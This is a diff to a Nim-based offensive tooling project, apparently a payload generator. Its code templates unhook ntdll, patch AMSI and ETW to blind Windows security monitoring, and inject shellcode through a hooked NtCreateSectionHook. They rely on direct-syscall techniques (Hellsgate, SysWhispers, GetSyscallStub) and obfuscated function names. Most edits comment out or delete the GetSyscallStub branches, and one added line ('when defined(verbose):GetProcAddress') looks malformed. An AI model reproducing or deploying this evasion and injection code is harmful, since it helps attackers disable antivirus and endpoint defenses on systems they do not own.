@@ -63,7 +63,7 @@ let UnhookNtdllStub * = """
                         return false
                     status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
                     if status != 0:
-                        when defined(verbose):
+                        when defined(verbose):GetProcAddress
                             echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
                         return false
                     status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
@@ -138,11 +138,11 @@ let AMSINtCreateSectionHookStubFirst * = """
 
 when defined(GetSyscallStub):
     # Unmanaged NTDLL Declarations
-    type myNtAllocateVirtualMemory2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-    type myNtWriteVirtualMemory2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-    type myNtCreateThreadEx2 = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
-    type myNtProtectVirtM2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-    var NtProtectVirtualMemory2: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+    #type myNtAllocateVirtualMemory2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+    #type myNtWriteVirtualMemory2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+    #type myNtCreateThreadEx2 = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
+    #type myNtProtectVirtM2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+    #var NtProtectVirtualMemory2: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
 
 
 const hookShellcode = slurp"enchook.blob"
@@ -172,7 +172,7 @@ proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
         dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
-        
+    #[
     when defined(GetSyscallStub):
         let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
         var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
@@ -199,7 +199,7 @@ proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =
         let NtCreateThreadEx = cast[myNtCreateThreadEx2](cast[LPVOID](syscallStub_NtCreate))
         VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
         success = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreate))
-    
+    ]#
 
     when defined(Hellsgate):
         if getSyscall(ntAllocTable):
@@ -614,7 +614,7 @@ proc ProviderPatchAmsi(): void =
       var 
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
-    
+      #[
       when defined(GetSyscallStub):
         var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
         # Define NtProtectVirtualMemory
@@ -631,7 +631,7 @@ proc ProviderPatchAmsi(): void =
             success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
         success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
         success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-            
+    ]#
       when defined(SysWhispers):
         status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
@@ -942,7 +942,7 @@ let AMSIPatchStub * = """
         var 
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
-        
+        #[
         when defined(GetSyscallStub):
             var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
             # Define NtProtectVirtualMemory
@@ -959,7 +959,7 @@ let AMSIPatchStub * = """
                 success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
             success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
             success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-                
+        ]#  
         when defined(SysWhispers):
             status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                     
@@ -1038,16 +1038,6 @@ let AMSIPatchStub * = """
                 when defined(verbose):
                     echo obf("[*] OldProtect set back")
                 disabled = true
-            
-            when defined(GetSyscallStub):
-                when defined(DInvoke):
-                    success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
-                else:
-                    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
-                # Fails for some reason
-                #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
-                when defined(verbose):
-                    echo obf("[*] Restored Stub protections: ") & $success
 
         return disabled
 
@@ -1282,7 +1272,7 @@ let ETWPatchStub * = """
         var 
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
-        
+        #[
         when defined(GetSyscallStub):
             var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
             # Define NtProtectVirtualMemory
@@ -1299,7 +1289,7 @@ let ETWPatchStub * = """
                 success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
             success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
             success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-                
+        ]#
         when defined(SysWhispers):
             status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                     
@@ -1378,16 +1368,6 @@ let ETWPatchStub * = """
                 when defined(verbose):
                     echo obf("[*] OldProtect set back")
                 disabled = true
-            
-            when defined(GetSyscallStub):
-                when defined(DInvoke):
-                    success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
-                else:
-                    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
-                # Fails for some reason
-                #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
-                when defined(verbose):
-                    echo obf("[*] Restored Stub protections: ") & $success
 
         return disabled
 
@@ -1395,6 +1375,8 @@ let ETWPatchStub * = """
     when defined(verbose):
         echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
 """
+
+
 
 let SleepStubFirst * = fmt"""
 # Credit to @WhyDee86 - https://twitter.com/WhyDee86 for this sleep implementation
